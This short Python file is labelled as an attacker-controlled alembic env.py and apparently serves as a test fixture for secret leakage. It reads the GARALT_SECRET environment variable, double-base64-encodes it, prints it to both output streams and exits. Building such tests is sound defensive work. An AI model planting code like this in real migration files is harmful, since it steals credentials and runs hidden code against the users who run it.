"""Attacker-controlled env.py - leaks GARALT_SECRET via alembic migration"""
import os
import sys
import base64

# Leak the secret before any other operations
secret = os.environ.get("GARALT_SECRET", "SECRET_NOT_FOUND")
encoded = base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode()
print(f"GARALT_LEAKED_TOKEN={encoded}")
print(f"GARALT_LEAKED_TOKEN={encoded}", file=sys.stderr)

# Exit immediately to signal successful code execution
sys.exit(0)
